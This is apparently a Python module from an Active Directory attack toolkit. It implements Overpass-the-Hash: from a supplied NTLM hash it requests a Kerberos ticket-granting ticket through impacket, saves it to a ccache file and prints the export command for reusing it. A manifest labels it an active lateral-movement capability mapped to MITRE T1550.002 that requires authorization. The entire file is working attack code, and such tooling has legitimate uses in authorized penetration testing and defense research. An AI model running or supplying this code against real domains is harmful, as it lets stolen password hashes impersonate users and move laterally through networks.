"""Overpass-the-Hash — convert NTLM hash to Kerberos TGT."""


import os
import sys
from typing import Any

from adxpl.core.credential import ADCredential


MANIFEST = {
    "capability_id": "adxpl.lateral.overpass.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["kerberos_tgt_request"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1550.002"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)

    if not cred.has_hash:
        print("[!] Overpass-the-Hash requires --hashes LM:NT", file=sys.stderr)
        return 1

    print(f"[*] Overpass-the-Hash → {args.target} ({args.domain}\\{cred.username})")

    try:
        from impacket.krb5.kerberosv5 import getKerberosTGT
        from impacket.krb5 import constants
        from impacket.krb5.types import Principal
        from impacket.krb5.ccache import CCache
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    user_name = Principal(cred.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

    lm_hash = bytes.fromhex(cred.lm_hash) if cred.lm_hash else b"\x00" * 16
    nt_hash = bytes.fromhex(cred.nt_hash)

    try:
        tgt, cipher, old_session_key, session_key = getKerberosTGT(
            user_name, "", args.domain,
            lm_hash, nt_hash, None, args.target,
        )
        print(f"[+] TGT obtained for {cred.username}@{args.domain.upper()}")

        ccache = CCache()
        ccache.fromTGT(tgt, old_session_key, session_key)

        ccache_path = os.path.join(args.output if hasattr(args, "output") else "/tmp",
                                    f"{cred.username}@{args.domain}.ccache")
        ccache.saveFile(ccache_path)
        print(f"[+] CCache saved: {ccache_path}")
        print(f"[*] Usage: export KRB5CCNAME={ccache_path}")
        return 0

    except Exception as exc:
        print(f"[-] Overpass-the-Hash failed: {exc}", file=sys.stderr)
        return 1
